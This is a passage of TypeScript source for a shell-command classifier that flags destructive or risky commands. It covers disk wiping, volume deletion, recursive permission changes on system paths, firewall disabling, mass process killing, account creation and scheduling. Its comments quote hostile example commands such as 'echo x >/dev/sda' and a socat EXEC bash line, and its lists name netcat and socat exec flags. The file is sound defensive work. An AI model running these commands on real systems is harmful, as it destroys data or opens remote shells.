// Long-form design notes: docs/dev/command-classifier.md
/** The flags that write, for the same programs, checked before the read-only list. */
const DISK_DESTRUCTIVE_FLAGS: ReadonlySet<string> = new Set(["--zap-all", "--zap", "mklabel", "mkpart", "mkfs"]);

/**
 * Destroying a disk, on the two shapes it comes in.
 *
 * One is a program that writes a filesystem; the other is a shell redirect
 * aimed at a block device, which needs no program at all — `> /dev/sda` after
 * `echo` is enough, and so is `echo x >/dev/sda` with no space at all. That
 * second spelling is why this rule reads the segment as text rather than
 * treating the redirect operator and its target as two separate words: they do
 * not have to be two words, and a rule that assumed they were would miss the
 * shorter of the two spellings.
 *
 * `dd` is neither, and is handled by its output option instead: `dd` is used
 * legitimately all day (`dd if=/dev/zero of=image.img bs=1M count=64`), so a
 * rule that caught the program would catch a disk image being built. Only the
 * `of=` naming a block device is a disk. `of=` is written glued — `of=/dev/sda`
 * — because that is the spelling everybody uses, and no other `dd` option
 * contains the two characters, so looking for them anywhere in the token is
 * unambiguous. The harmless half was run here to fix the spelling: `dd
 * if=/dev/zero of=/dev/null bs=1M count=1` printed `1+0 records out` and wrote
 * nothing anywhere.
 */
/**
 * The paths a `dd` names as its output.
 *
 * Shared by {@link posixDiskRules} and {@link posixStartupWrite} on purpose. `dd
 * of=/dev/sda` and `dd of=/etc/cron.d/job` are the same option reaching two
 * different families, and when the parse was written twice it was fixed once — the
 * reason a regular expression shared by a matcher and a message is a single
 * function in this file. One reader, two callers.
 *
 * `of=` is required at the *start* of a token. `indexOf` would also fire on a file
 * whose own name contains `of=`, and the option is glued by `dd`'s own syntax, so
 * there is no spelling this misses.
 */
function ddOutputTargets(segment: string): string[] {
	const targets: string[] = [];
	for (const token of tokenizeShell(segment)) {
		if (!token.startsWith("of=")) continue;
		targets.push(token.slice(3).replace(/^["']|["']$/g, ""));
	}
	return targets;
}

/**
 * The `wipefs` flags that erase rather than list.
 *
 * Four spellings for two options, and the short/long split is from the manual
 * rather than from habit: `-a` is single-dash, `--all` is double, and the same
 * for `-o` and `--offset`. Reading only one spelling of each would let
 * `wipefs --all /dev/sda` through, which is the spelling a script writes.
 *
 * Both quotes are from `wipefs(8)`: "Erase all available signatures" for
 * `-a, --all`, and `-o, --offset` specifies "the location (in bytes) of the
 * signature which should be erased from the device".
 *
 * **`-t` is deliberately absent.** The manual says the set erased by `-a` "can
 * be restricted with the -t option", so `wipefs -t ext4 /dev/sda` still erases
 * something — it is narrower, not inert — and it is already caught by the fact
 * that `-t`'s value is not what makes the branch pass: without `-a` or `-o`
 * there is nothing to erase. Anything that passes this table is treated as
 * erasing, so leaving `-t` out cannot make the rule miss; it can only mean
 * `wipefs -t ext4` alone, which is a listing, stays quiet.
 *
 * **`-O` is deliberately absent, and its absence is load-bearing.** `wipefs(8)`
 * lists `-O, --output` alongside `-o, --offset`, and they differ only in case:
 * the first chooses an output format, the second names a signature to erase. The
 * set is matched case-sensitively at the call site for exactly that reason, so
 * this table must not grow `-O` or `--OUTPUT`.
 */
const WIPEFS_ERASING_FLAGS: ReadonlySet<string> = new Set(["-a", "--all", "-o", "--offset"]);

function posixDiskRules(tokens: string[], segment: string): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "posix");
	if (program === undefined) return null;

	// A redirect is matched on the text and the target is matched by the device
	// shape, which is what keeps this narrow. `2>&1` yields no target because
	// nothing after the `>` begins with a slash, and `> /dev/null` yields one
	// that is not a disk.
	for (const match of segment.matchAll(/>{1,2}\s*(\/[^\s;|&]+)/g)) {
		if (BLOCK_DEVICE_PATH.test(match[1])) {
			return { kind: "Other", rule: `output redirected onto \`${match[1]}\`, which is a whole disk` };
		}
	}

	if (program === "dd") {
		for (const target of ddOutputTargets(segment)) {
			if (BLOCK_DEVICE_PATH.test(target)) {
				return { kind: "Other", rule: `\`dd\` writing to \`${target}\`, which is a whole disk` };
			}
		}
		return null;
	}

	if (!mkfsVariant(program) && !DISK_WRITING_PROGRAMS.has(program)) return null;

	// `shred` is not asked anything: it overwrites a file until nothing of it is
	// left and then deletes it, which is the whole of its purpose and is why it
	// has no read-only spelling worth naming. Both halves of that were run here,
	// on a file this script created: `shred -u -n 1 -z <tempfile>` exited 0 and
	// the file was gone.
	if (program === "shred") {
		return { kind: "Other", rule: "`shred`, which overwrites a file until nothing of it is left" };
	}

	// Long-form design notes: docs/dev/command-classifier.md
	const rest = tokens.slice(1);
	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "wipefs" && (rest.includes("-n") || rest.includes("--no-act"))) return null;
	if (program === "wipefs" && !rest.some((arg) => WIPEFS_ERASING_FLAGS.has(arg))) {
		return null;
	}
	if (rest.some((arg) => DISK_DESTRUCTIVE_FLAGS.has(arg.toLowerCase()))) {
		if (rest.some((arg) => BLOCK_DEVICE_PATH.test(arg)) || program === "sgdisk") {
			return {
				kind: "Other",
				rule: `\`${program}\` with a flag that writes a partition table over what is on it`,
			};
		}
	}
	if (rest.some((arg) => DISK_LIST_FLAGS.has(arg.toLowerCase()))) return null;
	// After the shared list, after the destructive-flag check, and for the same
	// reason the destructive check runs first: the exemption is a claim about the
	// whole command line. `sfdisk -d /dev/sda` prints and `sfdisk -d /dev/sda
	// --relabel gpt` does not, and only the ordering tells those apart.
	const programReadOnly = DISK_PROGRAM_READ_ONLY_FLAGS.get(program);
	if (programReadOnly !== undefined && rest.some((arg) => programReadOnly.has(arg))) return null;
	if (rest.some((arg) => BLOCK_DEVICE_PATH.test(arg))) {
		return { kind: "Other", rule: `\`${program}\` pointed at a disk, which overwrites what is on it` };
	}
	// Nothing to point at: `fdisk` on its own opens the first device it can find
	// and waits at a prompt where `w` writes a table. An error, otherwise.
	if (tokens.length === 1) {
		return { kind: "Other", rule: `\`${program}\` with no device named, which opens the first one it finds` };
	}
	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The directories whose permissions belong to the machine rather than to a project. */
const SYSTEM_ROOTS: ReadonlySet<string> = new Set([
	"/",
	"/bin",
	"/sbin",
	"/lib",
	"/lib32",
	"/lib64",
	"/usr/bin",
	"/usr/lib",
	"/usr/sbin",
	"/usr/include",
	"/etc",
	"/boot",
	"/dev",
	"/proc",
	"/sys",
	"/root",
	"/System",
	"/Library",
]);

// Long-form design notes: docs/dev/command-classifier.md
/** The first system root among these arguments, if any, compared on a path boundary. */
function touchesSystemRoot(tokens: string[]): string | undefined {
	for (const token of tokens) {
		// `/` must not be stripped down to the empty string, or the root itself
		// stops matching — which is what the probe caught, with
		// `chown -R root:root /` coming back as nothing at all.
		const path = token.length > 1 ? token.replace(/\/+$/, "") : token;
		if (!path.startsWith("/")) continue;
		if (SYSTEM_ROOTS.has(path)) return path;
		for (const root of SYSTEM_ROOTS) {
			if (root !== "/" && (path === root || path.startsWith(`${root}/`))) return root;
		}
	}
	return undefined;
}

/**
 * A symbolic `chmod` operand: one or more clauses of who, a sign, and what.
 *
 * `u+s`, `ug+s`, `a+rwxs`, `u+s,g-s` are all this shape; `notes+s.txt` and
 * `755` and `/usr/bin/sudo` are not.
 */
const MODE_SYMBOLIC = /^[ugoa]*[-+=][rwxXstugoa]*(?:,[ugoa]*[-+=][rwxXstugoa]*)*$/;

// Long-form design notes: docs/dev/command-classifier.md
/** Does this argument make a file run as somebody other than its owner? */
function hasSetIdBit(tokens: string[]): boolean {
	// An argument is only read as a *mode* when it is shaped like one: three or
	// four octal digits, or clauses of `[ugoa]` and a sign and permissions.
	// Checking for a literal `+s` instead is how the probe caught a false
	// positive — `notes+s.txt` is a perfectly good filename, and the earlier
	// "no mode contains a `/`" guard did not rule it out, because that filename
	// has no slash either. The shape test rules it out: there is no `.` in it.
	for (const token of tokens.slice(1)) {
		if (MODE_SYMBOLIC.test(token)) {
			// Only a `+` sets a bit. `chmod -s f` takes the set-user-ID bit *away*,
			// which is the one thing this rule exists to catch nobody doing.
			if (/\+[rwxXstugoa]*s/.test(token)) return true;
			continue;
		}
		if (/^[0-7]{4,}$/.test(token) && (Number(token[0]) & 6) !== 0) return true;
	}
	return false;
}

/**
 * Permissions and ownership, recursively, over the machine.
 *
 * The shape is two conditions and both are needed. A recursive change is
 * ordinary — `chmod -R 755 build/` is in a thousand build scripts — and so is a
 * change to one of these paths — `chmod 755 /etc/nginx.conf` is an admin's
 * afternoon. What is neither is the two together, because that is the command
 * that leaves a machine with nobody able to log into it.
 *
 * The recursion flag may come either side of the mode (`chmod -R 755 /etc` and
 * `chmod 755 -R /etc` are both valid), so it is looked for anywhere rather than
 * at a fixed offset — which is the same reason `dangerousWindowsAdmin` scans
 * every argument rather than the first.
 */
/**
 * Volume managers: LVM, ZFS, and the discard tool that erases a whole device.
 *
 * None of these are reachable by the device-shape rule above, and the reason
 * differs per family, which is why they are here rather than added to
 * `DISK_WRITING_PROGRAMS`:
 *
 * - **LVM names its objects, not devices.** `lvremove vg0/lvol0` takes two
 *   names in one argument and never writes `/dev/...` on the command line, so
 *   there is no path to match. There is also no read-only spelling to spare:
 *   `lvremove(8)`'s synopsis is `lvremove position_args [ option_args ]` and its
 *   description is "lvremove removes one or more LVs", with `-f, --force`
 *   documented as "Override various checks, confirmations and protections" —
 *   that is about interactivity, not about whether anything is destroyed. So a
 *   bare `lvremove` destroys after a prompt and a rule that waited for `-f`
 *   would miss it. The read-only siblings are different programs (`lvs`, `vgs`,
 *   `pvs`, `lvdisplay`), which is what keeps this a program-name table.
 *
 * - **ZFS dispatches on a subcommand**, and the destructive three are a small
 *   minority of the verbs: `zfs destroy`, `zfs rollback`, `zpool destroy`
 *   against `zfs list`, `zfs get`, `zpool list`, `zpool status`. Naming the
 *   three rather than listing the safe ones means a verb added to ZFS later is
 *   quiet by default instead of dangerous by default.
 *
 * - **`blkdiscard`** is `blkdiscard [options] [-o offset] [-l length] device`:
 *   the device is a positional and the manual offers no list-only mode, warning
 *   "All data in the discarded region on the device will be lost!". It discards
 *   rather than overwrites, so the message says discard and does not claim the
 *   data was overwritten — the act is not the act `wipefs` performs.
 *
 * **The `-n` exemption is `zfs destroy`'s alone.** `zfs destroy(8)` documents
 * `-n` as "Do a dry-run ("No-op") deletion. No data will be deleted." The
 * synopsis of `zpool destroy` is `zpool destroy [-f] pool` with `-f` the only
 * option and no dry run documented, so no exemption is claimed for it and
 * `zpool destroy -n` still fires — the conservative direction for a flag whose
 * meaning is not established here.
 *
 * **`zfs rollback` is in this table and is not a deletion**, which is the point
 * of listing it separately in the messages. `zfs-rollback(8)`'s synopsis is
 * `zfs rollback [-Rfr] snapshot` and its two range options are described as
 * destroying what came later — `-R` "destroys later snapshots, bookmarks, and
 * their clones", `-r` "destroys snapshots and bookmarks later than the specified
 * one" — so the act is discarding everything written since that snapshot, and
 * there is no undo that is not another rollback. The message says that rather
 * than calling it a delete.
 *
 * **`zpool rollback` is deliberately absent, because it is not a command.**
 * It was in this table until it was measured rather than assumed: OpenZFS ships
 * no `zpool-rollback.8`, `man/man8/zpool.8` mentions `destroy` eight times and
 * `rollback` not at all, `cmd/zpool/` has no rollback source, and a code search
 * of the whole repository for the string `zpool rollback` returns zero hits. An
 * entry for a command that cannot be run is a claim about a program that does
 * not exist, so it is removed rather than left to look thorough. `zpool
 * rollback tank@snap` is therefore quiet, and the row that holds that is in the
 * test file.
 */
const LVM_DESTRUCTIVE_PROGRAMS: ReadonlyMap<string, string> = new Map([
	["lvremove", "`lvremove`, which removes one or more logical volumes"],
	["vgremove", "`vgremove`, which removes a volume group and its logical volumes"],
	["pvremove", "`pvremove`, which removes a physical volume from a volume group"],
]);

// Long-form design notes: docs/dev/command-classifier.md
/** The ZFS and Zpool verbs that destroy, and what each one actually does. */
const ZFS_DESTRUCTIVE_VERBS: ReadonlyMap<string, ReadonlyMap<string, string>> = new Map([
	[
		"zfs",
		new Map([
			["destroy", "destroys the named dataset"],
			["rollback", "discards everything written since that snapshot was taken"],
		]),
	],
	["zpool", new Map([["destroy", "destroys the named pool and frees its devices for other use"]])],
]);

/** A `-n` dry run, which `zfs destroy(8)` documents as deleting nothing. */
const ZFS_DRY_RUN_FLAGS: ReadonlySet<string> = new Set(["-n"]);

function posixVolumeRules(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "posix");
	if (program === undefined) return null;

	const byProgram = LVM_DESTRUCTIVE_PROGRAMS.get(program);
	if (byProgram !== undefined) return { kind: "Other", rule: byProgram };

	const rest = tokens.slice(1).filter((token) => !token.startsWith("-"));
	const flags = tokens.slice(1).filter((token) => token.startsWith("-"));

	if (program === "blkdiscard") {
		// Long-form design notes: docs/dev/command-classifier.md
		const device = rest.find((token) => token.startsWith("/dev/"));
		return device === undefined
			? null
			: {
					kind: "Other",
					rule: `\`blkdiscard\`, which discards the sectors of \`${device}\` so the data on them is gone`,
				};
	}

	if (program !== "zfs" && program !== "zpool") return null;

	// Long-form design notes: docs/dev/command-classifier.md
	const verb = rest[0];
	if (verb === undefined) return null;
	const phrase = ZFS_DESTRUCTIVE_VERBS.get(program)?.get(verb);
	if (phrase === undefined) return null;

	// Only `zfs destroy`'s dry run is exempted. See the note on the table.
	if (program === "zfs" && verb === "destroy" && hasZfsDryRunFlag(flags)) return null;

	return { kind: "Other", rule: `\`${program} ${verb}\`, which ${phrase}` };
}

// Long-form design notes: docs/dev/command-classifier.md
/** Is `-n` among these flags, counting POSIX option bundling? */
function hasZfsDryRunFlag(flags: string[]): boolean {
	return flags.some(
		(flag) =>
			ZFS_DRY_RUN_FLAGS.has(flag) ||
			(flag.startsWith("--") === false &&
				flag.length > 2 &&
				[...flag.slice(1)].some((letter) => ZFS_DRY_RUN_FLAGS.has(`-${letter}`))),
	);
}

// Long-form design notes: docs/dev/command-classifier.md
/** The block-device tools that dispatch on a subcommand: `nvme`, `cryptsetup` and `btrfs`. */
const SUBCOMMAND_DESTRUCTIVE_PROGRAMS: ReadonlyMap<string, ReadonlyMap<string, string>> = new Map([
	[
		"nvme",
		new Map([
			[
				"format",
				'`nvme format`, which formats the namespace — its own manual warns that assuming a device relationship from the name may "irrevocably erase data on an unintended device"',
			],
			[
				"sanitize",
				'`nvme sanitize`, which sends the device a Sanitize command; `--preq` is documented as the host "requesting that the user data be purged"',
			],
		]),
	],
	[
		"cryptsetup",
		new Map([
			[
				"luksFormat",
				'`cryptsetup luksFormat`, which writes a new LUKS header — "unless you have a header backup, all old encrypted data in the container will be permanently irretrievable"',
			],
			[
				"erase",
				'`cryptsetup erase`, which erases all keyslots, "removing the volume key", so the encrypted data is left in place and cannot be read — the manual is explicit that this "does not wipe or overwrite the data area"',
			],
			[
				"luksErase",
				'`cryptsetup luksErase`, which erases all keyslots, "removing the volume key", so the encrypted data is left in place and cannot be read — the manual is explicit that this "does not wipe or overwrite the data area"',
			],
		]),
	],
	[
		"btrfs",
		new Map([
			[
				"subvolume delete",
				"`btrfs subvolume delete`, which removes the subvolume from the filesystem; `-R` also removes those beneath each one",
			],
			[
				"device remove",
				"`btrfs device remove`, which takes the device out of the filesystem, relocating what was stored on it",
			],
			[
				"device delete",
				"`btrfs device delete`, which takes the device out of the filesystem, relocating what was stored on it — the manual calls this an alias of `remove`",
			],
		]),
	],
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Options documented to take their value as a **separate word**, so the word after them is an argument and not a verb. */
const SEPARATE_VALUE_OPTIONS: ReadonlyMap<string, ReadonlySet<string>> = new Map([["nvme", new Set(["-o"])]]);

// Long-form design notes: docs/dev/command-classifier.md
/** `nvme`'s dry run, and the only one of the three. */
const NVME_DRY_RUN_FLAGS: ReadonlySet<string> = new Set(["--dry-run"]);

// Long-form design notes: docs/dev/command-classifier.md
/** The device forms `nvme(1)` documents. */
const NVME_DEVICE_PATH = /^\/dev\/nvme\d+(?:n\d+(?:p\d+)?)?\/?$/;

// Long-form design notes: docs/dev/command-classifier.md
/** A `btrfs filesystem resize` size argument that **decreases** the filesystem. */
const BTRFS_SHRINK_SIZE = /^(?:[^-\s][^:]*:)?-\d+[kKmMgGtTpPeE]?$/;

function posixSubcommandVolumeRules(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "posix");
	if (program === undefined) return null;

	const actions = SUBCOMMAND_DESTRUCTIVE_PROGRAMS.get(program);
	if (actions === undefined) return null;

	const args = tokens.slice(1);
	const valueOptions = SEPARATE_VALUE_OPTIONS.get(program);
	const bare: string[] = [];
	for (let i = 0; i < args.length; i++) {
		const token = args[i];
		if (token.startsWith("-")) {
			// A flag documented to take its value as the next word claims that word
			// as an argument, so a verb is never read out of it.
			if (valueOptions?.has(token) === true) i += 1;
			continue;
		}
		bare.push(token);
	}

	// `btrfs` is the one program here whose action is two words — `subvolume
	// delete`, `device remove` — so its key is matched against the first two
	// bare words joined. Nothing about that needs the option grammar above,
	// because the two words are adjacent in every documented spelling.
	const key = program === "btrfs" ? bare.slice(0, 2).join(" ") : bare[0];
	if (key === undefined || key === "") return null;

	// The operand is required, because all three tools require one and a rule
	// that fired on the action alone would fire on a fragment of a longer line.
	// It is also what keeps the reading of the action honest: `nvme`'s own
	// warning is about acting on the wrong device, so a device is what this
	// asks for.
	const operandPresent =
		program === "btrfs"
			? bare.some((word) => word.startsWith("/"))
			: bare.some((word) => (program === "nvme" ? NVME_DEVICE_PATH.test(word) : word.startsWith("/dev/")));
	if (!operandPresent) return null;

	if (program === "nvme" && args.some((token) => NVME_DRY_RUN_FLAGS.has(token))) return null;

	// Long-form design notes: docs/dev/command-classifier.md
	if (key === "filesystem resize") {
		return args.some((token) => BTRFS_SHRINK_SIZE.test(token))
			? {
					kind: "Other",
					rule: '`btrfs filesystem resize`, which **decreases** the size of the filesystem — "If the prefix + or - is present the size is increased or decreased by the quantity size"',
				}
			: null;
	}

	// Long-form design notes: docs/dev/command-classifier.md
	const phrase = [...actions.entries()].find(([name]) => name.toLowerCase() === key.toLowerCase())?.[1];
	if (phrase === undefined) return null;

	return { kind: "Other", rule: phrase };
}
function posixPermissionRules(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "posix");
	if (program === undefined) return null;
	const recursive = tokens
		.slice(1)
		.some((arg) => arg === "-R" || arg === "--recursive" || arg === "-r" || /^--recursive=/.test(arg));

	if (program === "chmod" && hasSetIdBit(tokens)) {
		return { kind: "Other", rule: "`chmod` setting the set-user-ID or set-group-ID bit" };
	}
	if (program !== "chmod" && program !== "chown" && program !== "chgrp") return null;
	if (!recursive) return null;
	const root = touchesSystemRoot(tokens.slice(1));
	if (root === undefined) return null;
	return {
		kind: "Other",
		rule: `\`${program}\` applied recursively to \`${root}\`, which is the machine's`,
	};
}

/** The `find` predicates that run a command on everything they match. */
const FIND_EXEC_PREDICATES: ReadonlySet<string> = new Set(["-exec", "-execdir", "-ok", "-okdir"]);

/** Commands that destroy a file when `find` hands them one. */
const DELETING_COMMANDS: ReadonlySet<string> = new Set(["rm", "rmdir", "unlink", "shred"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Deleting what a search found, without ever naming `rm`. */
function posixFindRules(tokens: string[]): DangerousCommandMatch | null {
	if (executableName(tokens[0], "posix") !== "find") return null;
	if (tokens.slice(1).includes("-delete")) {
		return { kind: "Other", rule: "`find -delete`, which removes everything it matches" };
	}
	for (let i = 1; i < tokens.length; i++) {
		if (!FIND_EXEC_PREDICATES.has(tokens[i])) continue;
		const verb = executableName(tokens[i + 1] ?? "", "posix");
		if (verb !== undefined && DELETING_COMMANDS.has(verb)) {
			return { kind: "Other", rule: `\`find\` running \`${verb}\` on everything it matches` };
		}
	}
	return null;
}

/** Signals that leave a process no chance to save anything. */
const FORCED_SIGNALS: ReadonlySet<string> = new Set(["9", "kill", "sigkill", "k"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Does this argument name the signal `-s`/`--signal` was given, or is it itself the signal? */
function namesForcedSignal(arg: string): boolean {
	// Both spellings are in the set rather than one being derived from the other:
	// `KILL` and `SIGKILL` are two names for signal 9, and `kill -l` on this
	// box's bash answers `KILL  9` for both. Stripping a `sig` prefix would have
	// been the tidier way to say that, and a mutation driver caught that it
	// changes nothing — so the set says both and the strip is not there.
	const bare = arg.replace(/^-+/, "").toLowerCase();
	return FORCED_SIGNALS.has(bare);
}

// Long-form design notes: docs/dev/command-classifier.md
/** Ending processes, stopping services, and putting the machine away. */
const SERVICE_STOP_VERBS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
	["systemctl", new Set(["stop", "disable", "mask", "kill"])],
	["launchctl", new Set(["unload", "disable", "bootout"])],
	["service", new Set(["stop"])],
]);

// Long-form design notes: docs/dev/command-classifier.md
/** The other direction: verbs that put a unit where a boot will find it. */
const SERVICE_INSTALL_VERBS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
	// `link` registers a unit file that lives outside the search path, so it is
	// an install spelled differently rather than a different act.
	["systemctl", new Set(["enable", "link"])],
	// `bootstrap` is the modern spelling of `load`; the removal half above
	// already carries `bootout`, which is `unload`'s modern spelling.
	["launchctl", new Set(["load", "bootstrap", "enable"])],
]);

/** Programs that stop the machine or the session, with no way to argue. */
const POWER_PROGRAMS: ReadonlySet<string> = new Set(["reboot", "halt", "poweroff"]);

/**
 * `shutdown` switches that put a POSIX machine away.
 *
 * `-c` is not in it and never could be: it *cancels* a pending shutdown.
 */
const POSIX_SHUTDOWN_SWITCHES: ReadonlySet<string> = new Set(["-h", "-r", "-p", "--halt", "--reboot", "--poweroff"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Switching a host protection off, on POSIX. */
const POSIX_PROTECTION_OFF: ReadonlyMap<string, ReadonlySet<string>> = new Map([
	["ufw", new Set(["disable", "reset"])],
	["nft", new Set(["flush"])],
	["setenforce", new Set(["0", "permissive"])],
	["aa-disable", new Set([])],
	["firewall-cmd", new Set(["--set-default-zone=trusted"])],
]);

// Long-form design notes: docs/dev/command-classifier.md
/** Is this `iptables` invocation emptying a table or opening a default policy? */
function iptablesFlushesOrOpensPolicy(tokens: string[]): DangerousCommandMatch | null {
	for (let i = 1; i < tokens.length; i++) {
		// No `toLowerCase()`: `-F` and `-f` are different switches, and this is
		// `wipefs -O`/`-o` all over again, for the same reason.
		const token = tokens[i];
		if (token === "-F" || token === "--flush") {
			return {
				kind: "Other",
				rule: "`iptables` emptying a ruleset, which removes every rule that was filtering traffic",
			};
		}
	}
	// `-P <chain> <target>`. Only ACCEPT opens it; DROP and REJECT are the
	// tightening directions and belong to a rule that does not exist.
	const policy = tokens.findIndex((t) => t === "-P" || t === "--policy");
	if (policy !== -1 && tokens[policy + 2]?.toLowerCase() === "accept") {
		return {
			kind: "Other",
			rule: "`iptables` setting a chain's default to ACCEPT, which lets through every packet no rule matches",
		};
	}
	return null;
}

function posixProtectionRules(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "posix");
	if (program === undefined) return null;

	if (program === "iptables" || program === "ip6tables") {
		return iptablesFlushesOrOpensPolicy(tokens);
	}

	// `aa-disable` takes no arguments at all, so it is matched on the program
	// rather than through the verb loop below.
	if (program === "aa-disable") {
		return { kind: "Other", rule: "`aa-disable`, which turns AppArmor off" };
	}

	const verbs = POSIX_PROTECTION_OFF.get(program);
	if (verbs === undefined) return null;
	for (const token of tokens.slice(1)) {
		// `--set-default-zone=trusted` arrives glued, so a verb set that holds a
		// switch has to be compared whole rather than as a bare word.
		if (verbs.has(token.toLowerCase())) {
			return { kind: "Other", rule: `\`${program} ${token}\`, which switches a host protection off` };
		}
	}
	return null;
}

function posixProcessRules(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "posix");
	if (program === undefined) return null;
	const args = tokens.slice(1);

	if (program === "kill") {
		// `--` gets no special handling, and that is a decision rather than an
		// oversight: a mutation that stopped reading past it turned out to change
		// nothing at all, because `-1` is a PID and never a flag or a signal, so
		// it is found wherever it sits. Code that cannot be distinguished from its
		// own deletion is not coverage.
		if (!args.includes("-1")) return null;
		return {
			kind: "Other",
			rule: "`kill` sent to `-1`, which is every process the user owns",
		};
	}

	if (program === "pkill" || program === "killall") {
		if (!args.some(namesForcedSignal)) return null;
		return {
			kind: "Other",
			rule: `\`${program}\` with an unignorable signal, which ends every process it names`,
		};
	}

	const verbs = SERVICE_STOP_VERBS.get(program);
	if (verbs !== undefined) {
		for (const token of args) {
			if (!token.startsWith("-") && verbs.has(token.toLowerCase())) {
				return { kind: "Other", rule: `\`${program} ${token}\`, which stops a service` };
			}
		}
	}

	const installs = SERVICE_INSTALL_VERBS.get(program);
	if (installs !== undefined) {
		for (const token of args) {
			if (!token.startsWith("-") && installs.has(token.toLowerCase())) {
				return {
					kind: "Other",
					rule: `\`${program} ${token}\`, which makes a service start at every boot, without anyone there to ask`,
				};
			}
		}
	}

	if (verbs !== undefined) return null;

	// Long-form design notes: docs/dev/command-classifier.md
	if (program === "shutdown") {
		if (!args.some((arg) => POSIX_SHUTDOWN_SWITCHES.has(arg))) {
			return null;
		}
		return { kind: "Other", rule: "`shutdown`, which powers the machine off or restarts it" };
	}

	// `init 0` and `telinit 0` are the SysV spellings: the runlevel is the
	// argument. 0 is halt and 6 is reboot, so the two need different words and
	// the earlier version of this returned "halts" for both — a message that is
	// wrong about half of what it catches. The rule itself is right and is what
	// the flagging needs; only the claim about what happens was wrong.
	if (program === "init" || program === "telinit") {
		const runlevel = args.find((arg) => arg === "0" || arg === "6");
		if (runlevel === undefined) return null;
		const what = runlevel === "0" ? "halts" : "reboots";
		return { kind: "Other", rule: `\`${program} ${runlevel}\`, which ${what} the machine` };
	}

	if (POWER_PROGRAMS.has(program)) {
		return { kind: "Other", rule: `\`${program}\`, which powers the machine off or restarts it` };
	}

	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** Accounts, and the capabilities attached to a program. */
const POSIX_ACCOUNT_PROGRAMS: ReadonlyMap<string, string> = new Map([
	["useradd", "creates an account, which is a way back into this machine"],
	["adduser", "creates an account, which is a way back into this machine"],
	["usermod", "changes an account, which can hand it more than it had"],
	["userdel", "deletes an account"],
	// The group half of the same act, and here for the reason `adduser` is beside
	// `useradd`: a table that named the account half and left this out would look
	// complete and would be half of it.
	["groupdel", "deletes a group"],
	["chpasswd", "sets account passwords, which can lock every account's owner out"],
	// `setcap` is the file-capability spelling of the same grant: the bit stays on
	// the file after its owner changes and after the set-user-ID bit is stripped,
	// which is the property that makes it worth a rule rather than a `chmod u+s`
	// note.
	["setcap", "gives a file a capability it keeps without being set-user-ID"],
]);

function posixAccountRules(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "posix");
	if (program === undefined) return null;
	const why = POSIX_ACCOUNT_PROGRAMS.get(program);
	if (why === undefined) return null;
	return { kind: "Other", rule: `\`${program}\`, which ${why}` };
}

/**
 * `crontab`'s three spellings that do not install a job.
 *
 * The whole reason this table exists is that the other three are the ordinary
 * ones: `-e` is where a person writes a crontab, `-l` prints one, and `-r`
 * removes the current user's whole crontab.
 */
const CRONTAB_NON_INSTALLING_FLAGS: ReadonlySet<string> = new Set(["-e", "-l", "-r"]);

// Long-form design notes: docs/dev/command-classifier.md
/** Handing a command to a scheduler that will run it with nobody there. */
function posixSchedulingRules(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "posix");
	if (program === undefined) return null;
	const args = tokens.slice(1);

	if (program === "at" || program === "batch") {
		// `at -l` lists the queue and installs nothing. `batch` has no listing
		// switch, so `at` is the only one of the two this exemption can apply to.
		if (program === "at" && args.includes("-l")) return null;
		return {
			kind: "Other",
			rule: `\`${program}\`, which runs a command later, without anyone there to read what it did`,
		};
	}

	if (program === "crontab") {
		if (args.some((arg) => CRONTAB_NON_INSTALLING_FLAGS.has(arg))) return null;
		return {
			kind: "Other",
			rule: "`crontab`, which installs a job the scheduler runs with no login needed",
		};
	}

	return null;
}

// Long-form design notes: docs/dev/command-classifier.md
/** The switches that make one of the netcat family run a program instead of reading one. */
const NETCAT_EXEC_FLAGS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
	["ncat", new Set(["-e", "--exec", "-c", "--sh-exec"])],
	["nc", new Set(["-e"])],
	["netcat", new Set(["-e", "-c"])],
]);

// Long-form design notes: docs/dev/command-classifier.md
/** A socket tool that runs a program on the far end of its own connection. */
function posixSocketExecRules(tokens: string[]): DangerousCommandMatch | null {
	const program = executableName(tokens[0], "posix");
	if (program === undefined) return null;
	const args = tokens.slice(1);

	if (program === "socat") {
		// The address type may be written `EXEC:` or `exec:` and may sit anywhere in
		// a comma-separated address list, glued to its command:
		// `socat EXEC:'/bin/bash -li',pty,stderr host:1`. So it is searched for
		// anywhere in the token rather than anchored, and `SYSTEM:` — the other
		// address type that spawns something — is deliberately not read here.
		if (!args.some((arg) => arg.toLowerCase().includes("exec:"))) return null;
		return { kind: "Other", rule: "`socat` with an `EXEC:` address, which runs a program on the far end" };
	}

	// The lookup is also the guard: a name that is not a key is not a netcat, and
	// there is no second list of names to fall out of step with this one.
	const execFlags = NETCAT_EXEC_FLAGS.get(program);
	if (execFlags === undefined) return null;
	if (!args.some((arg) => execFlags.has(arg.toLowerCase()))) return null;
	return {
		kind: "Other",
		rule: `\`${program}\` with a program behind it, which runs that program instead of reading this side of the socket`,
	};
}

// ---------------------------------------------------------------------------
// Windows: PowerShell cmdlets, CMD builtins, and ShellExecute-style launches
// ---------------------------------------------------------------------------

/** Strip the punctuation PowerShell glues around a bareword. */
function bareWord(token: string): string {
	return token
		.replace(/^['"]+/, "")
		.replace(/['"]+$/, "")
		.toLowerCase();
}

const URL_SHAPE_RE = /^[ "'(\s]*([^\s"');]+)[\s;)]*$/;

// Long-form design notes: docs/dev/command-classifier.md
/** Does this argument name a web address? */
function looksLikeUrl(token: string): string | undefined {
	const lower = token.toLowerCase();
	const at = lower.indexOf("https://");
	const from = at === -1 ? lower.indexOf("http://") : at;
	const candidate = from === -1 ? token : token.slice(from);
